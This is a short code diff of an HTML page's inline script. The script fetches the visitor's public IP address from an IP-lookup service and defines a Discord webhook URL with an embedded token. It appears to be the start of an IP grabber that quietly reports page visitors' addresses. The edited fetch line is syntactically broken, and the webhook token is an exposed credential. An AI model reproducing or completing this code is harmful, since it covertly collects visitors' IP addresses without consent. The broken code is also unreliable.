@@ -9,8 +9,8 @@
   <script>
     const ipurl = "https://api.ipify.org?format=json";
 
-        const response = fetch(ipurl)
-       console.log(response.text)
+        const response = fetch(ipurl){
+        .then(res => res.text())}
     
     const whurl =
       "https://discord.com/api/webhooks/845950238719213608/OlWrovNwzQIgXHqGL1zlw5AyeMUg5M_QtCfXNqs7zDI1zlIv1gml_aET2InT6iBXyuaf";
